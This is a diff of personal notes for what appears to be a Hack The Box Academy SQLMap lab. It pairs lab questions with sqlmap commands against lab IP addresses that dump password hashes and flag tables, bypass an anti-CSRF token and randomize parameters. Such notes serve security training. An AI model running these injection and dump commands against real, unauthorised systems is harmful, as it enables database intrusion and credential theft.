@@ -170,14 +170,15 @@ What's the name of the column containing "style" in it's name? (Case #1) = Detec
 sqlmap -u "http://165.22.126.213:31234/case1.php?id=1" --search -C style 
 What's the Kimberly user's password? (Case #1)
 sqlmap -u "http://165.22.126.213:31234/case1.php?id=1" --passwords --batch --dump
-sqlmap -u "http://165.22.126.213:32170/case8.php" -randomize=rp --batch -v 5 | grep URI
 What's the contents of table flag8? (Case #8)
 get token name and value via browser > network > requests.
 sqlmap -u "http://178.128.163.230:31018/case8.php" --data="id=1&t0ken=Af1394DLz9Q2HfMDehREVTpjL6jlULjqLCrM2UO4vY" --csrf-token="t0ken" --batch --dump
 What's the contents of table flag9? (Case #9)
 sqlmap -u "http://178.128.163.230:31018/case9.php?id=1&uid=29125" --randomize=uid --batch --dump -v 5 | grep HTB
 
-
+http://178.128.163.230:31018/case10.php
+sqlmap -u "http://178.128.163.230:31018/case10.php" --passwords --batch --dump
+https://forum.hackthebox.com/t/academy-sqlmap-essentials-case-10/4310  -D -schema -tor
 http://178.128.163.230:31018/case9.php?id=1&uid=810305537
 7F4DA0C0j5OW2hdOZ2ec65wGMFj0Qp0ub3pfpU0ZwQ
 
